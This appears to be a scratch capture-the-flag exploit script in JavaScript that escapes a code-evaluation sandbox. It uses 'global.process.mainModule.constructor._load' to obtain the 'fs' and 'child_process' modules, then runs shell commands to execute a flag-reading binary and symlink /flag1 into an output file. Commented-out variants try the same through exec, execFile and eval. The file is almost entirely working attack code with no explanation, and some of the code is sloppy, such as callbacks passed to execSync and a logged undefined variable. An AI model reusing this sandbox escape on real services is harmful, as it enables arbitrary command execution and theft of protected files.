// eval.call('console.log(1)')
// eval.call('z')
var fs = global.process.mainModule.constructor._load('fs')
var child_process = global.process.mainModule.constructor._load('child_process')

child_process.execSync('./read_flag2', function (error, stdout, stderr) {
        console.log('Exec success?')
        console.log('error:', error)
        console.log('stdout:', stdout)
        console.log('stderr:', stderr)
        if(error) {
            console.log('Exec error')
            console.error('Error: ', error)
            return
        }
    })

child_process.execSync('ls -al /flag1 && ln -sf /flag1 ./output.txt && \
    echo flag{fakeflag} >>./output.txt && ./read_flag2', function (error, stdout, stderr) {
        console.log('Exec success?')
        console.log('error:', error)
        console.log('stdout:', stdout)
        console.log('stderr:', stderr)
        if(error) {
            console.log('Exec error')
            console.error('Error: ', error)
            return
        }
    })

console.log('opening /tmp/read_flag2');
fs.readFileSync('/tmp/read_flag2', function(err, data) {
    if (err) {
        return console.error(err);
    }
    console.log("open success");
    console.log(data);
});




/*
child_process.execSync('/tmp/read_flag2', function (error, stdout, stderr) {
    console.log('Exec success?')
    console.log('error:', error)
    console.log('stdout:', stdout)
    console.log('stderr:', stderr)
    if(error) {
        console.log('Exec error')
        console.error('Error: ', error)
        return
    }
})
*/

// console.log(fs)
// var buf = new Buffer.alloc(1024);

/*
console.log('opening /flag2');
fs.readFile('code.wppl', function(err, data) {
    if (err) {
        return console.error(err);
    }
    console.log("open success");
    console.log(data);
});
*/

/*
.execFile('./read_flag2', function (error, stdout, stderr) {
    console.log('Exec success')
    console.log('stdout:', stdout)
    console.log('stderr:', stderr)
    if(error) {
        console.log('Exec error')
        console.error('Error: ', error)
        return
    }
})
// var child_process = _top.eval('global.process.mainModule.constructor._load(\'child_process\')')
// console.log(_top.eval('global.process.mainModule.constructor._load(\'child_process\').exec(\'/tmp/read_flag2\')'))
// inside a model
/*
fs.readFile('/flag2', 'utf8', function(err, dataStr){
    if(err) {
        return console.log('Error: ' + err.message)
    }
    console.log(da)
})
*/